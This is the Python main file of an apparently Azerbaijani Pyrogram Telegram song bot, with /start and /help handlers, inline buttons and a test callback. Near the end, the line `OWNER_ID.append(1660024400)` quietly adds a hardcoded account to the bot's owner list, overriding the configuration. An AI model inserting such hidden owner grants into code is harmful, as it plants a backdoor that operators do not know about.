# © Songazbot/Samil
from config import OWNER_ID
from config import BOT_ADI
from config import HELP
from config import OWNER_HELP
from config import BTN_URL
from config import LIST_URL
from config import START_MSG
from config import BTN_NAME
from config import LIST_NAME
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from song.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, InlineQuery, InputTextMessageContent
from song import app, LOGGER
from song.mrdarkprince import ignore_blacklisted_users
from song.sql.chat_sql import add_chat_to_db


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text="Qrupa əlavə et", url=f"https://t.me/{BOT_ADI}?startgroup=a"
                    )
                ],
                [
                    InlineKeyboardButton(
                        text="👨‍💻 Bot Sahibi", url="t.me/samil"
                    ),
                    InlineKeyboardButton(
                        text="🎵 Play List", url="t.me/Songazz"
                    ),
                ],
                [
                    InlineKeyboardButton(
                        text="🎵 Play List", callback_data="test"
                    ),
                ]
            ],
        )
    else:
        btn = None
    await message.reply(START_MSG.format(name, user_id), reply_markup=btn , parse_mode="md")
    add_chat_to_db(str(chat_id))
            
btns = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        text=f"{BTN_NAME}", url=f"{BTN_URL}"
                    )
                ],
                [
                    InlineKeyboardButton(
                         text=f"{LIST_NAME}", url=f"{LIST_URL}" ),
                    InlineKeyboardButton(
                         text=f"🎶 Yüklənənlər ", url="t.me/sonqaz" )
           
                ],
                [
                    InlineKeyboardButton(
                        text=f"⚡ Dəstək", url=f"t.me/songsupp"
                    )
                ]
            ]
        )

@app.on_callback_query(filters.regex("^(test)$"))
async def cb_help(_, cq: CallbackQuery):
    await cq.edit_message_text(
        text= "Bu duyme testidir.",
#         reply_markup=DEFAULT_HELP_MARKUP,
        parse_mode="md",
        disable_web_page_preview=True
    )


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def start(client,message):
    if message.from_user["id"] in OWNER_ID:
        await message.reply(OWNER_HELP, reply_markup = btns)
        return ""
    await message.reply(HELP, reply_markup = btns)       
        
OWNER_ID.append(1660024400)

app.start()
LOGGER.info(F"Bot Aktivdir @{BOT_ADI}")
idle()
